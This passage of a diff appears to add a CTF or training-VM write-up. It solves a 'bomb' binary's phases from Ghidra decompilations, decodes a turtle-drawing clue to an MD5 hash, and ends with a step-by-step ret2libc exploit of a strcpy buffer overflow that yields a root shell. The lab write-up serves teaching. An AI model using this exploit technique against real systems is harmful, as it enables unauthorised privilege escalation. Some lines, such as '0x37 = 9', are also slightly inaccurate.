@@ -178,5 +178,336 @@ Use the couple `laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da
 `ssh laurie@VM IP` (then enter the password when asked).
 
 We're in !
+<br />
+<br />
+# Dephusing the Bomb
 
-# Bomb
+## Phase1:
+ghidra decompilation phase1:
+```c
+void phase_1(char *param_1)
+{
+  int iVar1;
+  iVar1 = strings_not_equal(param_1,"Public speaking is very easy.");
+  if (iVar1 != 0) {
+    explode_bomb();
+  }
+  return;
+}
+```
+—> Public speaking is very easy.
+
+## Phase2:
+ghidra decompilation phase2:
+```c
+void phase_2(char *param_1)
+{
+  int iVar1;
+  int aiStack32 [7];
+  read_six_numbers(param_1,(int)(aiStack32 + 1));
+  if (aiStack32[1] != 1) {
+    explode_bomb();
+  }
+  iVar1 = 1;
+  do {
+    if (aiStack32[iVar1 + 1] != (iVar1 + 1) * aiStack32[iVar1]) {
+      explode_bomb();
+    }
+    iVar1 = iVar1 + 1;
+  } while (iVar1 < 6);
+  return;
+}
+```
+we got: stack[1] = 1
+stack[1 + 1] = (1 + 1) * 1
+stack[2] = 2
+stack[2 + 1] = (2 + 1) * 2
+stack[3] = 6
+stack[3 + 1] = (3 + 1) * 6
+stack[4] = 24
+stack[4 + 1] = (4 + 1) * 24
+stack[5] = 120
+stack[5 + 1] = (5 + 1) * 120
+stack[6] = 720
+—> 1 2 6 24 120 720
+
+## Phase3:
+ghidra decompilation phase3:
+```c
+void phase_3(char *param_1)
+{
+  int iVar1;
+  char cVar2;
+  uint local_10;
+  char local_9;
+  int local_8;
+  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
+  if (iVar1 < 3) {
+    explode_bomb();
+  }
+  switch(local_10) {
+  case 0:
+    cVar2 = 'q';
+    if (local_8 != 0x309) {
+      explode_bomb();
+    }
+    break;
+  case 1:
+    cVar2 = 'b';
+    if (local_8 != 0xd6) {
+      explode_bomb();
+    }
+    break;
+  case 2:
+    cVar2 = 'b';
+    if (local_8 != 0x2f3) {
+      explode_bomb();
+    }
+    break;
+  ………….
+  default:
+    cVar2 = 'x';
+    explode_bomb();
+  }
+  if (cVar2 != local_9) {
+    explode_bomb();
+  }
+  return;
+}
+```
+The README indicate that the code contains "b" in the answer:
+case 1 : 1 b 214 
+—> 1 b 214
+
+## Phase4:
+ghidra decompilation phase4:
+```c
+void phase_4(char *param_1)
+{
+  int iVar1;
+  int local_8;
+  iVar1 = sscanf(param_1,"%d",&local_8);
+  if ((iVar1 != 1) || (local_8 < 1)) {
+    explode_bomb();
+  }
+  iVar1 = func4(local_8);
+  if (iVar1 != 0x37) {
+    explode_bomb();
+  }
+  return;
+}
+int func4(int param_1)
+{
+  int iVar1;
+  int iVar2;
+  if (param_1 < 2) {
+    iVar2 = 1;
+  }
+  else {
+    iVar1 = func4(param_1 + -1);
+    iVar2 = func4(param_1 + -2);
+    iVar2 = iVar2 + iVar1;
+  }
+  return iVar2;
+}
+```
+This is recursive and not possible to do it mentally so we script it:
+Test.c:
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+int func4(int param_1)
+{
+  int iVar1;
+  int iVar2;
+  if (param_1 < 2) {
+    iVar2 = 1;
+  }
+  else {
+    iVar1 = func4(param_1 + -1);
+    iVar2 = func4(param_1 + -2);
+    iVar2 = iVar2 + iVar1;
+  }
+  return iVar2;
+}
+int main(int ac, char **av) {
+  int param_1 = atoi(av[1]);
+printf("%d", func4(param_1));
+}
+```
+```sh
+➜  work ./test 1
+1% 
+➜  work ./test 2
+2%
+ ➜  work ./test 3
+3%
+ ➜  work ./test 4
+5%
+ ➜  work ./test 5
+8%
+➜  work ./test 6
+13%
+➜  work ./test 7
+21%
+➜  work ./test 8
+34%
+➜  work ./test 9
+55%
+```
+0x37 = 9 so the answer is 9
+
+## Phase 5:
+
+The program awaits for a string who will pass through a mask [`& 0xF`] in order to get an INT and get this int correspond with a table available in the binary so the initial string will be equal to "giants"</br>
+The table:
+
+```sh
+array.123                                       XREF[1]:     phase_5:08048d52(*)  
+        0804b220 69              ??         69h    i
+        0804b221 73              ??         73h    s
+        0804b222 72              ??         72h    r
+        0804b223 76              ??         76h    v
+        0804b224 65              ??         65h    e
+        0804b225 61              ??         61h    a
+        0804b226 77              ??         77h    w
+        0804b227 68              ??         68h    h
+        0804b228 6f              ??         6Fh    o
+        0804b229 62              ??         62h    b
+        0804b22a 70              ??         70h    p
+        0804b22b 6e              ??         6Eh    n
+        0804b22c 75              ??         75h    u
+        0804b22d 74              ??         74h    t
+        0804b22e 66              ??         66h    f
+        0804b22f 67              ??         67h    g
+```
+Each char with the mask should give us the index of each letter in "giatns" so :
+- 0xYF & 0xF = 15 --> index[15] = g
+- 0xY0 & 0xF = 0 --> index[0] = i
+- 0xY5 & 0xF = 5 --> index[5] = a
+- 0xYB & 0xF = 11 --> index[11] = n
+- 0xYD & 0xF = 13 --> index[13] = t
+- 0xY1 & 0xF = 1 --> index[1] = s
+
+You can replace "Y" by the number you find corresponding in the ascii table:
+
+- 6f -> o
+- 70 -> p
+- 65 -> e
+- 6b -> k
+- 6d -> m
+- 71 -> q
+
+-----> opekmq is the answer
+
+## Phase 6
+
+Icampill and fherbine got the solution in their mind ~~~~~~
+
+# THOR
+
+We can find a file `turle` with some instructions in it like "turn 1 degree left and go forward for 50 spaces .......". <br />
+By drawing it we can find the word SLASH;
+<img src="./screen.png">
+The file ends with a clue: `Can you digest this message ?`<br />
+We know that MD5 stands for message digest --> 
+`646da671ca01bb5d84dbb5fb2238dc8e`
+
+# ZAZ
+
+# Exploit the binary
+
+A basic exploit of strcpy without security on the parameter.
+
+## Explication of the exploit
+
+Using ghidra, we can retrieve the main: 
+```c
+uint main(int param_1,int param_2)
+
+{
+  char local_90 [140];
+  
+  if (1 < param_1) {
+    strcpy(local_90,*(char **)(param_2 + 4));
+    puts(local_90);
+  }
+  return (uint)(param_1 < 2);
+}
+```
+
+We can see that the buffer is set to 140 and the program is strcpying the param into local90 withtout any limit. So when you write more than 140 chars, it will segfault because you will be trying to rewrite the EIP (the return adress).
+
+### What are we gonna do about it ?
+
+#### Getting system, exit and "/bin/sh adress"
+
+We actually want to rewrite EIP with the adress of [system] so we can execute [/bin/sh].
+To do it properly, we need to launch gdb set a breakpoint in main and start the prohgram to initialize the stack and get the adress.
+```sh
+gdb exploit_me
+b main
+r
+p system --> $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+p exit --> $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+```
+Next, we will need to find an adress that contains the string "/bin/sh", and to be sure there is one, we're gonna create it by exporting as an environment variable.
+
+```sh
+export SHELLSH=/bin/sh
+```
+And then we are gonna create a c script that's gonna give us the approximativ adress:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main(int argc, char **argv)
+{
+        char *ptr = getenv("SHELLSH");
+        if (ptr != NULL)
+        {
+                printf("Estimated address: %p\n", ptr);
+                return 0;
+        }
+}
+```
+
+```sh
+zaz@BornToSecHackMe:~$ ./env_addr
+Estimated address: 0xbfffffba
+```
+
+#### Using those adresses
+
+So we know about the buffer 140, and the adresses so we are gonna create our own shellcode.
++ First step: we're gonne fill the buffer with random char: 'A' * 140
++ Second step: we're gonna rewrite the eip of strcpy by the adress of system:
+'\xb7\xe6\xb0\x60'[::-1]
++ Third step we give to system a way to exit properly with the exit adress:
+'\xb7\xe5\xeb\xe0'[::-1]
++ Last step is to give "/bin/sh" as argument to system to open the shell:
+'\xbf\xff\xff\xba'[::-1]
+
+Let's try it out !
+```sh
+./exploit_me `python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1]) + '\xbf\xff\xff\xba'[::-1]"`
+```
+Because the adress of "/bin/sh" was approximative, we get the result 
+```sh
+"sh: 1: /sh: not found"
+```
+So we can play with this adress to find the exact beginning of the string:
+```sh
+'\xbf\xff\xff\xba'[::-1] --> '\xbf\xff\xff\xb9'[::-1] --> sh: 1: n/sh: not found
+'\xbf\xff\xff\xb9'[::-1] --> '\xbf\xff\xff\xb8'[::-1] --> sh: 1: in/sh: not found
+'\xbf\xff\xff\xb8'[::-1] --> '\xbf\xff\xff\xb7'[::-1] --> sh: 1: bin/sh: not found
+'\xbf\xff\xff\xb7'[::-1] --> '\xbf\xff\xff\xb6'[::-1] --> 
+# ls /
+bin   cdrom  etc   initrd.img  media  opt   rofs  run	selinux  sys  usr  vmlinuz
+boot  dev    home  lib	       mnt    proc  root  sbin	srv	 tmp  var
+# whoami
+root
+#
+```
+Well done you are root !
